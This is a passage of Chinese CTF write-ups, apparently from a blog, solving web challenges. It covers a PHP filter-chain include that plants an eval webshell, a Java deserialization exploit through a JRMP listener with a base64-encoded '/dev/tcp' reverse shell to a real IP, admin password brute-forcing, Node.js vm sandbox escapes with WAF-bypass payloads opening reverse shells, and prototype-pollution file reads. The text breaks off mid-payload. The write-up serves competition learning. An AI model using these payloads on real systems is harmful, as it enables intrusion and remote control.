href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT">PHP_INCLUDE_TO_SHELL_CHAR_DICT:（提供了Fuzz脚本）</a></p><p>注意：以上项目只实现了构造目标字符串，字符集可能存在乱码，如果要构造明确的字符，需要了解基</p><p>本原理</p><p>考法:</p><ol><li><p>文件包含直接rce(绕过include指定后缀或文件限制)</p></li><li><p>构造任意字符过判断</p></li></ol><p>注意一下：</p><p>如果服务器无响应说明生成的php filter chain中有&#x3D;&#x3D;靶机系统不支持的字符集&#x3D;&#x3D;,换一个项目生</p><p>成，注意一下，我这里用的是PHP_INCLUDE_TO_SHELL_CHAR_DICT项目</p><p>构造一句话木马 <?php eval($_GET[1]);?></p><p>​p><p><img src="https://bu.dusays.com/2024/05/15/66441f38c93f4.png" alt="image-20240503212045939"></p><p>构造好get传上去，然后 system(‘&#x2F;readflag’); 就能出</p><h2 id="baby-unserialize"><a href="#baby-unserialize" class="headerlink" title="baby_unserialize"></a>baby_unserialize</h2><p>Java反序列化+Jrmp绕过黑名单</p><p><img src="https://bu.dusays.com/2024/05/15/66441f365d4db.png" alt="image-20240503211121812"></p><p>f12有hint:</p><p><img src="https://bu.dusays.com/2024/05/15/66441f377d83e.png" alt="image-20240503211154599"></p><p>访问一下</p><p><img src="https://bu.dusays.com/2024/05/15/66441f36b814d.png" alt="image-20240503211221359"></p><p>到这里就不会了</p><p>随便post一下</p><p>发现反序列化的点：</p><p><img src="https://bu.dusays.com/2024/05/15/66441f38d0b8a.png" alt="image-20240503211300949"></p><p>URLDNS链验证</p><p><img src="https://bu.dusays.com/2024/05/15/66441f371e708.png" alt="image-20240503211332636"></p><p>说明入口类 source Hashmap可用</p><p>该处存在Java反序化漏洞点，而且出网</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">welcome to this fantastic tool</span><br><span class="line">Try this one</span><br><span class="line">rO0ABXQAVklmIHlvdSBkZXNlcmlhbGl6ZSBtZSBkb3duLCBJIHNoYWxsIGJlY29tZSBtb3JlIHBvd2Vy</span><br><span class="line">ZnVsIHRoYW4geW91IGNhbiBwb3NzaWJseSBpbWFnaW5l (you deserialize me down, I shall</span><br><span class="line">become more powerful than you can possibly imagine)</span><br><span class="line">&#123;http://irrfzuahtu.dgrh3.cnhttp://irrfzuahtu.dgrh3.cn&#125;</span><br><span class="line">Fin!</span><br></pre></td></tr></table></figure><p>直接打CC链，发现对payload base64解码后对关键词做了关键字过滤</p><p>TempleteImport 类被禁 考虑绕过Sink执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error occurred: Class name not accepted:</span><br><span class="line">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><br></pre></td></tr></table></figure><p>黑盒审计:猜测环境中是更为 &#x3D;&#x3D;通用性&#x3D;&#x3D; 的 CC3.2版本</p><p>简单试了一下其他1,3,5,7,11,CCK1没有成功</p><p>这里可以逐一对恶意类的过滤探索</p><p>&#x3D;&#x3D;可以像拼图一样 将Source,Gadget,Sink进行连接&#x3D;&#x3D;</p><p>在本地可以搭建环境用CodeQL辅助分析，但是是黑盒测试我们无法判断它具体是什么逻辑，可能花费</p><p>的时间会特别多,这也不像新生赛会考的</p><p>所以我们换个思路:</p><p>这里直接用Jrmp绕过黑名单限制</p><p>开个Jrmp恶意服务器 做&#x3D;&#x3D;中间代理&#x3D;&#x3D;进行跳板绕过(类似二次反序列化)</p><p>用CC3 做恶意荷载</p><p>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections3<br>‘bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNDguMTM1LjgyLjE5MC84ODg4IDA+JjE&#x3D;}|<br>{base64,-d}|{bash,-i}’</p><p><img src="https://bu.dusays.com/2024/05/15/66441f367398e.png" alt="image-20240503211449803"></p><p>本意是想直接用 ysoserial 进行 Client的配置</p><p>但是对yso生成的Client做了 关键词过滤</p><p>所以直接写个Jrmp client端生成:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">Jrmp</span> &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        ObjID <span class="built_in">id</span> = new ObjID();</span><br><span class="line">        TCPEndpoint te = new TCPEndpoint(<span class="string">&quot;23.94.38.86&quot;</span>, <span class="number">12345</span>);</span><br><span class="line">        LiveRef liveRef = new LiveRef(<span class="built_in">id</span>, te, false);</span><br><span class="line">        UnicastRef ref = new UnicastRef(liveRef);</span><br><span class="line">        RemoteObjectInvocationHandler obj = new</span><br><span class="line">RemoteObjectInvocationHandler(ref);</span><br><span class="line">        ByteArrayOutputStream barr = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">        //Jrmp client to <span class="keyword">try</span> <span class="keyword">try</span></span><br><span class="line">        byte[] byteArray = barr.toByteArray();</span><br><span class="line">        String res = Base64.getEncoder().encodeToString(byteArray);</span><br><span class="line">        System.out.println(res);</span><br><span class="line">        new ObjectInputStream(newByteArrayInputStream(byteArray)).readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/15/66441f383ba2f.png" alt="image-20240503182713124"></p><p>反弹shell后在环境变量中拿到flag</p><p><img src="https://bu.dusays.com/2024/05/15/66441f38ca30d.png" alt="image-20240503182736171"></p><p>最后主队排名是第7</p><p>结束 服了 filer chain的脚本不知道为什么跑不起 md WPS也是 复制个脚本 粘出来格式全是乱的 </p><p>nb 刚刚官方wp出了 我说我看看有没有要补充的 打开这个文件 文件崩了 后面写的wp全没了 666 QAQ</p><p>什么东西一直报毒 把我这个文件也一起被waf了 nm 重新杀了下毒 好像没问题了 </p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023-NKCTF-wp</title>
      <link href="/2024/05/15/2023-NKCTF-wp/"/>
      <url>/2024/05/15/2023-NKCTF-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="NKCTF-WP-WEB"><a href="#NKCTF-WP-WEB" class="headerlink" title="NKCTF WP WEB"></a>NKCTF WP WEB</h1><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>比赛结束 排名：48 </p><p><img src="https://bu.dusays.com/2024/05/15/66441db55e044.png" alt="image-20240325194057570"></p><p>也算是造神成功吧</p><p>我们队：</p><p><img src="https://bu.dusays.com/2024/05/15/66441db85dd3b.png" alt="image-20240325214319739"></p><p>还是可以</p><p>爆了1道web 2道misc 1道re 1道pwn</p><p>我会做的就3道 现在先复现一下web方向的题吧</p><p><img src="https://bu.dusays.com/2024/05/15/66441db4e7021.png" alt="image-20240325194620606"></p><h2 id="my-first-cms"><a href="#my-first-cms" class="headerlink" title="my first cms"></a>my first cms</h2><p>cms弱密码爆破+命令执行</p><p>这道是唯一写出来的web题</p><p>进来时一些页面 有新闻 下载等</p><p><img src="https://bu.dusays.com/2024/05/15/66441db4de776.png" alt="image-20240325194732447"></p><p>其实在最开始发现在url上有一些东西</p><p><img src="https://bu.dusays.com/2024/05/15/66441db584f13.png" alt="image-20240325194837561"></p><p>page可以通过数字改变来改变页面状态</p><p>然后尝试sql注入 无果</p><p>然后在首页发现登录连接</p><p><img src="https://bu.dusays.com/2024/05/15/66441db545569.png" alt="image-20240325195032700"></p><p>click here to login</p><p>点击后有登录页面</p><p><img src="https://bu.dusays.com/2024/05/15/66441db508e50.png" alt="image-20240325195118920"></p><p>cms的弱密码爆破</p><p>先猜user name 是admin</p><p>抓包：</p><p><img src="https://bu.dusays.com/2024/05/15/66441db5c57d6.png" alt="image-20240325195529321"></p><p>发给intruder</p><p><img src="https://bu.dusays.com/2024/05/15/66441db71259c.png" alt="image-20240325195811599"></p><p>标爆破目标</p><p>传字典</p><p><img src="https://bu.dusays.com/2024/05/15/66441db6c7b45.png" alt="image-20240325195844012"></p><p>开始用了一个5000的字典没爆破出来</p><p><img src="https://bu.dusays.com/2024/05/15/66441db644131.png" alt="image-20240325200015594"></p><p>找到302重定向</p><p>所以密码就是Admin123</p><p>登录 进入后台</p><p><img src="https://bu.dusays.com/2024/05/15/66441db7442b9.png" alt="image-20240325200213692"></p><p>有文件上传系统</p><p><img src="https://bu.dusays.com/2024/05/15/66441df1c4ce8.png" alt="image-20240325200326549"></p><p>可以通过写马进行后门连接</p><p>可以直接命令执行</p><p><img src="https://bu.dusays.com/2024/05/15/66441db642389.png" alt="image-20240325200721766"></p><p>要run两次可以执行一次命令</p><p><img src="https://bu.dusays.com/2024/05/15/66441db6adb47.png" alt="image-20240325200813773"></p><p>发现flag文件</p><p>直接cat</p><p><img src="https://bu.dusays.com/2024/05/15/66441db5cdee4.png" alt="image-20240325201230264"></p><h2 id="全世界最简单的CTF"><a href="#全世界最简单的CTF" class="headerlink" title="全世界最简单的CTF"></a>全世界最简单的CTF</h2><p><img src="https://bu.dusays.com/2024/05/15/66441db5bbfa6.png" alt="image-20240325201353536"></p><p>进来后只有一个这个界面</p><p>只能执行js代码</p><p>dirsearch扫一下</p><p><img src="https://bu.dusays.com/2024/05/15/66441dbb23901.png" alt="image-20240325202349709"></p><p>发现泄露 secret</p><p>访问</p><p><img src="https://bu.dusays.com/2024/05/15/66441db77fdbd.png" alt="image-20240325202543022"></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"></span><br><span class="line">app</span><br><span class="line">.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line">.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>))</span><br><span class="line">.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&#x27;public&#x27;</span>))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line">res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&#x27;/public/home.html&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">waf</span>(<span class="params">code</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> pattern = /(process|\[.*?\]|exec|spawn|<span class="title class_">Buffer</span>|\\|\+|concat|<span class="built_in">eval</span></span><br><span class="line">|<span class="title class_">Function</span>)/g;</span><br><span class="line"><span class="keyword">if</span>(code.<span class="title function_">match</span>(pattern))&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;what can I say? hacker out!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line"><span class="keyword">let</span> code = req.<span class="property">body</span>.<span class="property">code</span>;</span><br><span class="line"><span class="keyword">let</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">let</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="title function_">waf</span>(code)</span><br><span class="line"><span class="keyword">let</span> result = vm.<span class="title function_">runInContext</span>(code, context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e)&#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">message</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;./hack&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/secret&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(process.<span class="property">__filename</span> == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(__filename, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">send</span>(content);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(process.<span class="property">__filename</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">send</span>(content);</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">()=&gt;</span>&#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;listen on 3000&quot;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>交给ai后发现是vm沙箱逃逸</p><p><img src="https://bu.dusays.com/2024/05/15/66441db9777b3.png" alt="image-20240325203526702"></p><p>我也是卡在这里</p><p>有waf</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">waf</span>(<span class="params">code</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> pattern = /(process|\[.*?\]|exec|spawn|<span class="title class_">Buffer</span>|\\|\+|concat|<span class="built_in">eval</span></span><br><span class="line">|<span class="title class_">Function</span>)/g;</span><br><span class="line"><span class="keyword">if</span>(code.<span class="title function_">match</span>(pattern))&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;what can I say? hacker out!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随便在网上找了个payload来打</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">        <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">            <span class="keyword">const</span> p = (cc.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return process&#x27;</span></span>))();</span><br><span class="line">            <span class="keyword">return</span> p.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;whoami&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>但是waf过滤了几乎所以绕过</p><p>至少在比赛的这两天 我们尝试了网上能找到的几乎所以绕过方式 也没法绕过</p><p>我们也是卡在这里 没有解决</p><p>至此 有三种方式可以继续向下完成这道题</p><h3 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h3><p>继续绕过  果然 还有我们没想到的绕过方法可以继续</p><p>waf不允许出现[] exec process</p><p>process我们有两种方法绕过</p><p>一种是 String.fromCharCode 绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cc.constructor.constructor(&#x27;return process&#x27;)==cc.constructor.constructor(String.fromCharCode(114, 101, 116, 117, 114, 110, 32, 112, 114, 111, 99, 101, 115, 115)</span><br></pre></td></tr></table></figure><p>第二种我们可以发现他正则匹配没有i 也就是对大小写不敏感 我们可以通过js里面的 toLowerCase()绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return process==&#x27;return Process&#x27;.toLowerCase();</span><br></pre></td></tr></table></figure><p>接下来我们看最难的exec绕过，这个东西不是字符串，而是方法，所以我们并不能像之前两种方式绕过，我们选择 Reflect.get 方法绕过</p><blockquote><p>nodejs的命令执行绕过：</p><p>文章：<a href="https://www.anquanke.com/post/id/237032">https://www.anquanke.com/post/id/237032</a></p><p>在js中，需要使用Reflect这个关键字来实现反射调用函数的方式。譬如要得到eval函数，可以首先通过Reflect.ownKeys(global)拿到所有函数，然后global[Reflect.ownKeys(global).find(x&#x3D;&gt;x.includes(‘eval’))]即可得到eval<br>console.log(Reflect.ownKeys(global))<br>&#x2F;&#x2F;返回所有函数<br>console.log(global[Reflect.ownKeys(global).find(x&#x3D;&gt;x.includes(‘eval’))])<br>&#x2F;&#x2F;拿到eval<br>拿到eval之后，就可以常规思路rce了<br><code>global[Reflect.ownKeys(global).find(x=&gt;x.includes(&#39;eval&#39;))](&#39;global.process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&quot;curl 127.0.0.1:1234&quot;)&#39;)</code><br>这里虽然有可能被检测到的关键字，但由于mainModule、global、child_process等关键字都在字符串里，可以利用上面提到的方法编码，譬如16进制。<br><code>global[Reflect.ownKeys(global).find(x=&gt;x.includes(&#39;eval&#39;))](&#39;\x67\x6c\x6f\x62\x61\x6c\x5b\x52\x65\x66\x6c\x65\x63\x74\x2e\x6f\x77\x6e\x4b\x65\x79\x73\x28\x67\x6c\x6f\x62\x61\x6c\x29\x2e\x66\x69\x6e\x64\x28\x78\x3d\x3e\x78\x2e\x69\x6e\x63\x6c\x75\x64\x65\x73\x28\x27\x65\x76\x61\x6c\x27\x29\x29\x5d\x28\x27\x67\x6c\x6f\x62\x61\x6c\x2e\x70\x72\x6f\x63\x65\x73\x73\x2e\x6d\x61\x69\x6e\x4d\x6f\x64\x75\x6c\x65\x2e\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x2e\x5f\x6c\x6f\x61\x64\x28\x22\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73\x22\x29\x2e\x65\x78\x65\x63\x53\x79\x6e\x63\x28\x22\x63\x75\x72\x6c\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x31\x32\x33\x34\x22\x29\x27\x29&#39;)</code><br>这里还有个小trick，如果过滤了eval关键字，可以用includes(‘eva’)来搜索eval函数，也可以用startswith(‘eva’)来搜索</p><p>3.3 过滤中括号的情况<br>在3.2中，获取到eval的方式是通过global数组，其中用到了中括号[]，假如中括号被过滤，可以用Reflect.get来绕<br>Reflect.get(target, propertyKey[, receiver])的作用是获取对象身上某个属性的值，类似于target[name]。<br>所以取eval函数的方式可以变成<br>Reflect.get(global, Reflect.ownKeys(global).find(x&#x3D;&gt;x.includes(‘eva’)))<br>后面拼接上命令执行的payload即可。</p></blockquote><p><img src="https://bu.dusays.com/2024/05/15/66441db7c10cf.png" alt="image-20240325204728449"></p><p>所以 根据你提供的对象的键获取到对应的值 是不是和数组的索引有点像呢，我们用他来绕过</p><p>payload:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">        <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">            <span class="keyword">const</span> p = (cc.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return global&#x27;</span></span>))();</span><br><span class="line">            <span class="keyword">const</span> a = <span class="title class_">Reflect</span>.<span class="title function_">get</span>(p, <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(p).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">includes</span>(<span class="string">&#x27;pro&#x27;</span>))).<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">99</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">95</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">115</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">Reflect</span>.<span class="title function_">get</span>(a, <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(a).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">includes</span>(<span class="string">&#x27;ex&#x27;</span>)))(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>反弹shell拿flag</p><p>注：一定要是公网ip kali的ip监听不到</p><p><img src="https://bu.dusays.com/2024/05/15/66441db61a919.png" alt="image-20240325211333596"></p><p>直接&#x2F;readflag</p><p><img src="https://bu.dusays.com/2024/05/15/66441dbaa00ec.png" alt="image-20240325211422360"></p><h3 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h3><p>vm1漏洞加了一点限制，没有this 指针，但是因为有try，可以抛出异常来逃逸，payload如下</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">        <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">            <span class="keyword">const</span> p = (cc.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return procBess&#x27;</span>.replace(<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span>))();</span><br><span class="line">            <span class="keyword">const</span> obj = p.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_procBess&#x27;</span>.<span class="title function_">replace</span>(<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;&#x27;</span>));</span><br><span class="line">            <span class="keyword">const</span> ex = <span class="title class_">Object</span>.<span class="title function_">getOwnPropertyDescriptor</span>(obj, <span class="string">&#x27;exeicSync&#x27;</span>.<span class="title function_">replace</span>(<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;&#x27;</span>));</span><br><span class="line">            <span class="keyword">return</span> ex.<span class="title function_">value</span>(<span class="string">&#x27;whoami&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//一样的思路 但是是反弹shell</span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;,&#123;</span><br><span class="line">    <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">const</span> b = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span></span><br><span class="line">        <span class="keyword">const</span> p = (b.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return procBess&#x27;</span>.replace(<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span>))();</span><br><span class="line">        <span class="keyword">const</span> e = p.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_procBess&#x27;</span>.<span class="title function_">replace</span>(<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;&#x27;</span>));</span><br><span class="line">        <span class="keyword">const</span> c= <span class="title class_">Reflect</span>.<span class="title function_">get</span>(<span class="title class_">Reflect</span>.<span class="title function_">get</span>(e, <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(e).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">startsWith</span>(<span class="string">&#x27;ex&#x27;</span>)))(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip+/ 0&gt;&amp;1&quot;&#x27;</span>));</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/15/66441db647a38.png" alt="image-20240325211540945"></p><p>也是直接读&#x2F;readflag</p><p>环境问题 此方法没有弹出flag 但正常情况下一定能出</p><h3 id="法3"><a href="#法3" class="headerlink" title="法3"></a>法3</h3><p>根据源码可以看出是一个 vm 逃逸，但是 waf 过于强大，导致没法逃逸执行命令，只能另辟蹊径，可以发现 &#x2F;secret 中对 process.__filename 有一个判断，</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/secret&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(process.<span class="property">__filename</span> == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(__filename, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">send</span>(content);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(process.<span class="property">__filename</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">send</span>(content);</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>正常情况下，process 是没有__filename 这个属性的，猜测这里可以<strong>原型链污染</strong>，从而任意读取文件，回过来看逃逸这里，arguments.callee.caller 可以获取到沙盒外的一个对象，所以我们这里可以进行污染，如：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line"><span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">cc.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">__filename</span> = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这样就污染了 Object 的<code>__filename</code>属性，process 因为找不到<code>__filename </code>这个属性，就会到prototype 里去找，最终在 Object 找到这个属性，观察源码可以发现 require(‘.&#x2F;hack’) ，污染 process.__filename 为 &#x2F;app&#x2F;hack.js ，访问 &#x2F;secret，读取到 hack.js 的内容为 :</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;shell.js&#x27;</span>);</span><br></pre></td></tr></table></figure><p>继续读取 shell.js：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;shell&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> p = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line">p.<span class="title function_">execSync</span>(process.<span class="property">env</span>.<span class="property">command</span>);</span><br></pre></td></tr></table></figure><p>这里很明显 process.env.command 也能进行污染控制，问题是怎么 include shell.js，漏洞点在 require(‘&#x2F;hack’) ，打断点进入 require 方法调试，可以发现里面可以通过原型链污染控制某些属性的值，可以达到任意文件包含的效果，调试过程可以<a href="https://hujiekang.top/posts/nodejs-require-rce/">参考</a>，我们构造 payload 包含 shell.js，就可以 rce 了</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line"><span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span 